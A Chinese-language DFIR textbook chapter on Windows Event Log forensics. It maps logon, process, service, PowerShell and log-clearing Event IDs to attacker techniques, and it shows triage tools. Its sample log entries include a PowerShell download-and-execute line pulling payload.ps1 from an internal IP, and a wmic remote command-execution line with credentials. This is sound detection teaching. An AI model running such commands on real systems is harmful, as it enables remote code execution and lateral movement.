# Ch 18 — Event Log 鑑識

> 目標：能從 Windows Event Log（.evtx）找出登入序列、進程建立、服務安裝、PowerShell 執行、橫向移動，以及攻擊者清 log 的痕跡；能用 EvtxECmd / Chainsaw / Hayabusa 快速萃取高價值 Event，並把它們串進 timeline。
>
> 環境：Windows 鑑識工作站或 SIFT VM；工具 EvtxECmd（Eric Zimmerman）、Chainsaw（WithSecure）、Hayabusa（Yamato Security）；所有輸出標「（示意，依版本/樣本而異）」。

## 為什麼 Event Log 是 IR 的骨幹

Registry 給你靜態的植入痕跡。Event Log 給你的是**動態的行為序列**：誰在什麼時間登入、從哪裡來、跑了什麼程式、裝了什麼服務、清了哪條 log。沒有 Event Log，你只能從磁碟快照重建靜態狀態；有了 Event Log，你能重建時間序列——而時間序列才是事件調查的核心。

你在 AD 滲透練習裡做過 Pass-the-Hash：拿到 NTLM hash → 用 Mimikatz PtH → 橫向移動到另一台機器。現在換個角度：目標機器的 Security log 裡，那個連線的 Event 長什麼樣？logon type 是幾？哪個欄位暴露 PtH？這章回答這些問題。

## 先建立直覺：.evtx 結構與位置

### 實體位置

```
%SystemRoot%\System32\winevt\Logs\
```

關鍵 log 檔：

| 檔名 | 內容 |
|---|---|
| `Security.evtx` | 登入、登出、特權使用、帳號管理、物件存取（稽核） |
| `System.evtx` | 服務安裝/啟停、驅動載入、系統事件 |
| `Application.evtx` | 應用程式自報的事件 |
| `Microsoft-Windows-PowerShell%4Operational.evtx` | PowerShell 指令執行（需啟用 module logging / script block logging）|
| `Microsoft-Windows-Sysmon%4Operational.evtx` | Sysmon 遙測（進程建立、網路連線、Registry 異動等）|
| `Microsoft-Windows-TaskScheduler%4Operational.evtx` | Task Scheduler 執行紀錄 |
| `Microsoft-Windows-WMI-Activity%4Operational.evtx` | WMI 操作（T1047）|
| `Microsoft-Windows-Windows Defender%4Operational.evtx` | Defender 偵測與隔離事件 |

### .evtx 格式重點

- 二進位格式，magic `ElfFile\0`（8 bytes）
- 每個 record 有：EventID、時間戳（UTC，100 ns）、Provider（來源）、Channel（哪個 log）、以及 XML 格式的 EventData
- Default 最大 log 大小（Security）：20 MB；可設定最大 4 GB；超過 roll over 覆寫舊資料——這是攻擊者的機會
- Circular buffer 覆寫的機制是 FIFO，最舊的 record 先消失

### 取 log 的方式

**即時系統**：`wevtutil epl Security C:\security.evtx`

**鑑識映像**：直接從 `%SystemRoot%\System32\winevt\Logs\` 拷貝 .evtx（不需要解鎖，這些檔案不像 hive 那樣被獨佔鎖定）。

## 關鍵 Event ID 全覽

### 登入與登出

| Event ID | Channel | 含義 |
|---|---|---|
| 4624 | Security | 登入成功（Logon）|
| 4625 | Security | 登入失敗（Logon Failure）|
| 4634 | Security | 登出（Logoff），不一定每次都記錄 |
| 4647 | Security | 使用者主動登出（User Initiated Logoff）|
| 4648 | Security | 以明確憑證登入（Run As / alternate creds）|
| 4672 | Security | 特權登入（有 SE_PRIVILEGE 被賦予）|
| 4768 | Security | Kerberos TGT 請求（AS-REQ）|
| 4769 | Security | Kerberos Service Ticket 請求（TGS-REQ）|
| 4776 | Security | NTLM 認證嘗試（DC 端 NTLM challenge/response）|

**4624 的關鍵欄位：**

```xml
<EventData>
  <Data Name="SubjectUserName">SYSTEM</Data>
  <Data Name="TargetUserName">admin</Data>
  <Data Name="LogonType">3</Data>
  <Data Name="WorkstationName">ATTACKER-PC</Data>
  <Data Name="IpAddress">10.0.0.42</Data>
  <Data Name="IpPort">54321</Data>
  <Data Name="AuthenticationPackageName">NTLM</Data>
  <Data Name="LogonProcessName">NtLmSsp</Data>
</EventData>
```

### Logon Type 含義（完整表）

| Logon Type | 名稱 | 意義 | 鑑識重點 |
|---|---|---|---|
| 2 | Interactive | 本地鍵盤直接登入 | 物理接觸或 KVM |
| 3 | Network | 網路登入（SMB、net use） | 橫向移動常見，不快取憑證 |
| 4 | Batch | 排程任務用 | Scheduled Task 執行時 |
| 5 | Service | 服務帳號登入 | 惡意服務安裝後登入 |
| 7 | Unlock | 解除螢幕鎖定 | 本地存取 |
| 8 | NetworkCleartext | 網路登入但密碼明文傳送（舊版 IIS Basic Auth）| 少見，可疑 |
| 9 | NewCredentials | `runas /netonly`，本地用原身份但網路用新憑證 | PtH 變體 |
| 10 | RemoteInteractive | RDP / Terminal Services | 遠端桌面，有螢幕 |
| 11 | CachedInteractive | 域快取憑證，網路斷線時的本地登入 | |

### 進程建立

| Event ID | Channel | 含義 |
|---|---|---|
| 4688 | Security | 進程建立（Process Creation）|
| 1 | Sysmon Operational | 進程建立（比 4688 更完整，含 hash、parent）|

**4688 的關鍵欄位（需啟用進程命令列稽核）：**

```xml
<EventData>
  <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="CommandLine">cmd.exe /c powershell -enc JAB...</Data>
  <Data Name="ParentProcessName">C:\Windows\System32\wscript.exe</Data>
  <Data Name="SubjectUserName">victim</Data>
  <Data Name="TokenElevationType">%%1937</Data>  <!-- TokenElevationTypeFull = UAC bypass -->
</EventData>
```

啟用命令列記錄：`GPO → Computer Configuration → Administrative Templates → System → Audit Process Creation → Include command line`。如果沒開，4688 只有進程名稱沒有命令列——這是偵測的盲點。

### 帳號管理

| Event ID | 含義 |
|---|---|
| 4720 | 本地使用者帳號被建立 |
| 4722 | 帳號被啟用 |
| 4726 | 帳號被刪除 |
| 4728 | 使用者被加入全域群組 |
| 4732 | 使用者被加入本地群組（本地 Administrators 最高價值）|
| 4756 | 使用者被加入萬用群組（Universal Group）|

攻擊者常做的：建立一個帳號（4720）→ 加入 Administrators（4732）→ 用 RDP 登入（4624 type 10）→ 離開後刪帳（4726）。四個 Event ID 連起來就是完整的後門帳號生命週期。

### 服務與驅動

| Event ID | Channel | 含義 |
|---|---|---|
| 7045 | System | 新服務被安裝 |
| 7036 | System | 服務狀態改變（started/stopped）|
| 4697 | Security | 服務被安裝（需啟用稽核）|

7045 的關鍵欄位（示意，依版本/樣本而異）：

```
Log: System
EventID: 7045
Service Name: WindowsUpdateHelper
Service File Name: C:\ProgramData\wuhelper.exe
Service Type: user mode service
Service Start Type: auto start
Service Account: LocalSystem
```

`Service File Name` 若指向 `ProgramData`、`Temp`、`AppData` 這類非標準路徑，立刻可疑。

### PowerShell 執行

| Event ID | Channel | 含義 | 需要什麼設定 |
|---|---|---|---|
| 4103 | PowerShell Operational | Module Logging：pipeline 執行輸出 | `Enable Module Logging` GPO |
| 4104 | PowerShell Operational | Script Block Logging：完整指令碼 | `Enable Script Block Logging` GPO |
| 400/800 | Windows PowerShell | PowerShell 引擎開啟/管線執行（舊）| 預設記錄 |

Event 4104 是目前最有價值的 PowerShell 事件，會記錄整個 script block 的內容，包含 `Invoke-Expression`、encoded command 解碼後的內容。Windows 10 1803 以後，**即使沒開啟 GPO**，高風險 script（如含 `Invoke-Mimikatz` 字串）也會強制記錄到 4104（Protected Event Logging 的一部分）。

4104 範例（示意，依版本/樣本而異）：

```
EventID: 4104
Creating Script Block (path = ):
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')
```

### WMI 與 Task Scheduler

| Event ID | Channel | 含義 |
|---|---|---|
| 5857/5858/5860/5861 | WMI-Activity Operational | WMI 操作（5861 = 永久 event subscription 建立）|
| 106 | TaskScheduler Operational | Task 被登錄（新增）|
| 140 | TaskScheduler Operational | Task 被更新 |
| 141 | TaskScheduler Operational | Task 被刪除 |
| 200 | TaskScheduler Operational | Task 開始執行 |
| 201 | TaskScheduler Operational | Task 執行完成 |

攻擊者建立 WMI event subscription（T1546.003）最難找，因為 WMI repository 本身在磁碟上（`%SystemRoot%\System32\wbem\Repository\`），而 5861 是唯一能從 log 直接確認的 Event。

### Log 清除

| Event ID | Channel | 含義 |
|---|---|---|
| 1102 | Security | Security log 被清除（Audit log cleared）|
| 104 | System | System log 被清除 |

攻擊者清 Security log（1102）是入侵的強力指標——正常情況幾乎沒有人手動清 Security log。更重要的是：**清 log 這個動作本身也被記錄**——攻擊者無法同時清 log 又讓清 log 的 1102 消失（雞生蛋問題），除非他清完之後立刻清 1102，但那又會產生另一個 1102。

1102 的 EventData 包含：

```xml
<Data Name="SubjectUserName">attacker_admin</Data>
<Data Name="SubjectDomainName">CORP</Data>
<Data Name="SubjectLogonId">0x3e7</Data>
```

用 LogonId 可以關聯到 4624 找到這個 session 從哪裡來。

## 橫向移動的 Event 特徵

橫向移動在 Event Log 留下的痕跡集中在**目標機器**，而非攻擊者的機器。

### Network Logon（Type 3）

Pass-the-Hash 和 PsExec 都用 Type 3 登入，但有細微差異：

**合法的 Type 3 + NTLM**（如 `net use \\server\share /user:admin`）：

```
EventID: 4624
LogonType: 3
AuthenticationPackageName: NTLM
LogonProcessName: NtLmSsp
WorkstationName: WKSTN01
IpAddress: 192.168.1.10
TargetUserName: admin
```

**PtH（Pass-the-Hash）的特徵**：

```
EventID: 4624
LogonType: 3
AuthenticationPackageName: NTLM
LogonProcessName: NtLmSsp
WorkstationName: 空白 或與 IpAddress 不符
TargetUserName: admin
```

PtH 的關鍵識別點：
- `WorkstationName` 常為空或為攻擊者機器名稱（而不是合法機器）
- NTLM 認證（Kerberos 無法 PtH），所以 `AuthenticationPackageName: NTLM`
- 配合 4776（DC 端的 NTLM challenge 記錄）

### RDP（Type 10）

```
EventID: 4624
LogonType: 10
LogonProcessName: User32
WorkstationName: ATTACKER-PC
IpAddress: 10.0.0.42
```

Type 10 幾乎確定是 RDP。配合 TerminalServices-LocalSessionManager Operational log：

```
EventID: 21 - 遠端 Session 建立
EventID: 24 - 遠端 Session 斷開
EventID: 25 - 遠端 Session 重連
```

### PsExec 橫向移動

PsExec 在目標機器上會產生：

1. **7045**（System）：安裝 `PSEXESVC` 服務（Service File Name: `%SystemRoot%\PSEXESVC.exe`）
2. **4624**（Security）：Type 3 網路登入，隨後
3. **4688**（Security）：`cmd.exe` 或指定命令以 SYSTEM 身份跑起來

三個 Event 在時間上緊緊相連（秒級），這個模式幾乎是 PsExec 的指紋。

### WMIC 橫向移動

```
EventID: 4688
CommandLine: wmic /node:10.0.0.50 /user:admin /password:P@ssw0rd process call create "cmd.exe /c ..."
```

4688 會記錄 wmic 的完整命令列，包含目標 IP 和憑證（如果密碼寫在命令列上），這是自爆式的橫向移動。如果只有命令行但沒有密碼（pass-the-hash 模式），要靠 Type 3 login 在目標端佐證。

## 工具：快速萃取高價值 Event

### EvtxECmd（Eric Zimmerman）

把 .evtx 轉成 CSV，配合 Timeline Explorer 或 ELK 做 pivot：

```powershell
EvtxECmd.exe -d "C:\Evidence\Logs" --csv "C:\Output" --csvf events.csv
```

配合 MAP 設定檔（社群維護），會自動把重要欄位（IpAddress、CommandLine）提取到 CSV 欄位，不用自己 XPath。

### Chainsaw（WithSecure）

基於 Sigma 規則，對 .evtx 批次獵殺，輸出符合規則的 Event：

```bash
chainsaw hunt /mnt/evidence/Logs/ -s /opt/sigma/rules/windows \
  --mapping /opt/chainsaw/mappings/sigma-event-logs-all.yml \
  --output /output/chainsaw_results.json
```

Chainsaw 適合快速 triage：「這堆 log 裡有沒有符合已知 TTP 的 Event？」

### Hayabusa（Yamato Security）

也是 Sigma-on-evtx，但輸出更面向 timeline 重建，支援 DFIR timeline 格式輸出：

```bash
hayabusa.exe csv-timeline -d "C:\Evidence\Logs" -o timeline.csv -p verbose
```

Hayabusa 的 rule 集合專門針對 Windows threat hunting，涵蓋度比 vanilla Sigma 高，且有 level（critical/high/medium）分類。輸出 timeline 直接可以導入 Timeline Explorer 做視覺化。

## 具體範例：完整攻擊鏈重建

### 情境

攻擊者從外部 IP 10.0.0.42 進來，做了什麼？以下是 Security.evtx 和 System.evtx 的高價值 Event 時序（示意，依版本/樣本而異）：

```
2024-03-15 03:18:22Z  4625  Security  victim_admin 登入失敗（Type 3，來源 10.0.0.42）× 5
2024-03-15 03:18:31Z  4625  Security  administrator 登入失敗（Type 3，來源 10.0.0.42）× 3
2024-03-15 03:19:01Z  4624  Security  administrator 登入成功（Type 3，NTLM，來源 10.0.0.42）
2024-03-15 03:19:01Z  4672  Security  administrator 特權登入（SeBackupPrivilege, SeDebugPrivilege...）
2024-03-15 03:19:15Z  7045  System    服務安裝：PSEXESVC（C:\Windows\PSEXESVC.exe）
2024-03-15 03:19:16Z  4624  Security  SYSTEM 登入（Type 3，來源 10.0.0.42）
2024-03-15 03:19:16Z  4688  Security  cmd.exe（parent: PSEXESVC.exe，user: SYSTEM）
2024-03-15 03:19:18Z  4688  Security  powershell.exe -enc JABjAD...（parent: cmd.exe）
2024-03-15 03:22:11Z  Registry（Ch 17）：Run key 寫入 updater.exe
2024-03-15 03:22:45Z  1102  Security  Security log 被清除（by: administrator）
2024-03-15 03:22:46Z  4634  Security  administrator 登出
```

還原出的攻擊序列：
1. Brute force（4625 × 8）→ 猜中密碼（4624）
2. PsExec 安裝 PSEXESVC（7045）→ SYSTEM shell（4688）
3. PowerShell encoded command（4688）→ 下載並植入 persistence（Registry Run key）
4. 清 Security log（1102）→ 登出

**攻擊者犯的錯**：清了 log，但 1102 本身留下來了，而且 System.evtx 的 7045 沒清。Registry Run key 的 last write time 還是 03:22，整個時間軸仍然可還原。

### 範例 2：Kerberoasting 的 4769 特徵

正常的 4769（TGS-REQ）：

```
EventID: 4769
AccountName: normal_user@corp.local
ServiceName: MSSQLSvc/dbserver.corp.local:1433
TicketEncryptionType: 0x12  (AES256)
```

Kerberoasting 的 4769（請求了弱加密的 ticket）：

```
EventID: 4769
AccountName: attacker@corp.local
ServiceName: SPNservice
TicketEncryptionType: 0x17  (RC4-HMAC，可離線爆破)
FailureCode: 0x0  (成功)
```

`TicketEncryptionType: 0x17`（RC4-HMAC）是 Kerberoasting 的明確指標：正常環境如果啟用了 AES，合法使用者的 TGS 不會請求 RC4。攻擊者用 RC4 是因為 RC4 ticket 比 AES256 ticket 快幾個數量級可以破解。

短時間內（秒/分鐘）同一個帳號產生大量 4769 且全是 0x17，就是 Kerberoasting 掃描。

## 對比表格

| 攻擊 TTP | 關鍵 Event ID | 重要欄位 | 所在 Log |
|---|---|---|---|
| Brute force | 4625 × N | TargetUserName、IpAddress、LogonType | Security |
| PtH | 4624 type 3 + NTLM | AuthenticationPackageName、WorkstationName 異常 | Security |
| PsExec | 7045 + 4624 type 3 + 4688 | ServiceName=PSEXESVC | System + Security |
| RDP | 4624 type 10 | LogonProcessName=User32 | Security + TermSvc |
| 建立後門帳號 | 4720 + 4732 | TargetUserName、MemberName | Security |
| 服務安裝 | 7045 | ServiceFileName 非標準路徑 | System |
| PowerShell payload | 4104 | ScriptBlockText | PS Operational |
| Kerberoasting | 4769 type 0x17 | TicketEncryptionType | Security |
| Golden Ticket | 4624 type 3 無對應 4768 | LogonGuid 全零 | Security |
| Log 清除 | 1102 / 104 | SubjectUserName | Security / System |
| Task Scheduler 持久化 | 106 | TaskName、ActionCommand | TaskSched Operational |

## 踩雷

1. **4688 沒有命令列**：預設 Windows 的 4688 只記錄進程名，不記錄命令列參數。要去 GPO 開啟「Include command line in process creation events」。如果 IR 到手的機器沒開，4688 存在但對偵測 LOLBin 幾乎沒用，必須靠 Sysmon Event ID 1 補救。

2. **以為 4634 = 登出就代表 session 結束**：4634 不一定每次都記錄，且 Interactive session（RDP）的 session 可以 disconnect 但不 logoff（4647），要用 TerminalServices log 的 24（Disconnect）確認。

3. **Golden Ticket 的識別很難**：Golden Ticket 是直接用 krbtgt hash 偽造 TGT，繞過 DC 的 AS-REQ 流程，所以**不會產生 4768**。在目標機器看到 4624 type 3 Kerberos 登入，但 DC 的 Security log 沒有對應的 4768，是 Golden Ticket 的信號。但環境有多台 DC 或 log 遺漏時很難確認，要靠時間窗口異常（ticket 有效期超過 domain policy）。

4. **清 Security log（1102）後以為沒有痕跡**：1102 本身就記錄在 Security log，清完之後 log 第一筆就是 1102，告訴你有人清過。而且 System log 的 7045 等事件不在 Security log，清 Security log 清不掉。Sysmon 的 log 也是另一個 channel，獨立清除。

5. **把 4624 logon type 3 全當 lateral movement**：正常的 SMB 檔案存取（存取共用資料夾）也是 type 3。要加上 source IP、時間、是否有後續 4688/7045 等事件才能判定是橫向移動，單一 4624 type 3 沒有意義。

## 進階延伸

- **TerminalServices-RemoteConnectionManager%4Operational.evtx**：記錄 RDP 連線的 source IP，比 Security log 裡的 type 10 含有更多細節（連線、斷開、失敗的 RDP 嘗試都在這）。

- **Event ID 4776 + 4624 對應關係**：4776 在 DC 端記錄 NTLM 認證；如果 workstation 的 4624 AuthPackage 是 NTLM，但 DC 的 4776 找不到對應的記錄，可能是 local account 認證（SAM 認證，不過 DC）或是 credential 被 cached 使用。

- **DPAPI 相關 Event（4695/4694）**：DPAPI master key 解密/備份事件，Mimikatz 的 `sekurlsa::dpapi` 會觸發這些。

- **Windows Defender Event 1116/1117**：Defender 偵測到威脅（1116）和採取行動（1117），如果有這些 Event 但 payload 仍然執行成功，代表攻擊者做了 AMSI bypass 或修改了 Defender exclusion。

- **ETW 與 Security Log 的關係**：Windows Event Log 底層是 ETW（Event Tracing for Windows）。所有 Security log 都從 `Microsoft-Windows-Security-Auditing` provider 來，Sysmon 是另一個 ETW provider。理解這層架構有助於設計更難被繞過的遙測。

## 本章重點整理

- Event Log .evtx 位於 `%SystemRoot%\System32\winevt\Logs\`，Security/System 是核心，PowerShell Operational 與 Sysmon Operational 補完偵測視野。
- 4624 的 LogonType 是橫向移動鑑識的關鍵：Type 3=網路（PtH/PsExec），Type 10=RDP，Type 5=服務帳號。
- 4688 要開啟命令列記錄才有完整值；Sysmon Event ID 1 是備選。
- PsExec 指紋：7045（PSEXESVC）+ 4624 type 3 + 4688（SYSTEM）三連。
- Kerberoasting：4769 `TicketEncryptionType=0x17`（RC4）。
- 1102 清 log 無法消滅自身，且其他 channel 的 log 不連帶清除。
- 工具：EvtxECmd（轉 CSV）、Chainsaw（Sigma 快速 triage）、Hayabusa（timeline 導向輸出）。

## 自我檢核

- [ ] 我能說出 Security.evtx 和 PowerShell Operational.evtx 各在哪個實體路徑
- [ ] 給我一個 4624 事件，我能從 LogonType + AuthenticationPackageName 判斷是哪種登入
- [ ] 我能說出 4688 需要額外開什麼 GPO 才有命令列資訊
- [ ] 我能說出 PsExec 橫向移動在目標機器會留下哪三個 Event ID，各在哪個 Channel
- [ ] 我能說出 Kerberoasting 在 DC 的 Security log 裡是哪個 Event ID 的哪個欄位暴露它
- [ ] 我能說出 1102 為什麼不能被攻擊者自我消滅
- [ ] 我能說出 Golden Ticket 的 DC 端 log 特徵，以及為什麼比普通橫向移動難追

## 延伸閱讀

1. **SANS FOR508 — Advanced Incident Response** — Event Log 的深度課程材料，Section 3 專門講 Windows Event ID 分析；比 FOR500 更深，有大量真實攻擊樣本的 Event 截圖，和本章的橫向移動節是最佳配對。

2. **[Sigma Rules 官方庫](https://github.com/SigmaHQ/sigma/tree/master/rules/windows)** — 直接看已有哪些 Sigma 規則覆蓋哪些 Event ID，是反向學習「防守方在偵測什麼」的最快路徑；把 `windows/builtin/security/` 資料夾的規則掃一遍，你的 Event ID 知識會快速強化。

3. **[The DFIR Report — Event Log Timeline 重建案例](https://thedfirreport.com/)** — 搜尋 「event log」 相關案例，看職業 IR 如何把散落的 Event ID 串成攻擊時間軸，關注他們如何處理 log 被清除的情境。

4. **[Hayabusa 官方文件](https://github.com/Yamato-Security/hayabusa)** — 特別是 sigma rules 章節與 detection rule 撰寫；Hayabusa 的 `csv-timeline` 輸出格式直接可以導入 Timeline Explorer 做視覺化，是本課練習 B 的核心工具。

5. **Microsoft 官方 — [Security Monitoring Reference](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/security-monitoring-reference)** — 每個 Event ID 的官方欄位定義，遇到不確定的欄位含義直接查這裡；特別是 4624 的 `LogonType` 表和 4769 的 `TicketEncryptionType` 值對應表必看。

---

Registry 給了靜態的植入位置，Event Log 給了動態的行為序列。下一章把兩者整合，從系統化角度盤點 Windows persistence 的每一個向量，以及對應的偵測點——你會攻的每一種 persistence，防守方用哪個 artifact + 哪個 Event ID 抓到它。

→ [Ch 19 持久化偵測全景](./19-persistence-detection.md)
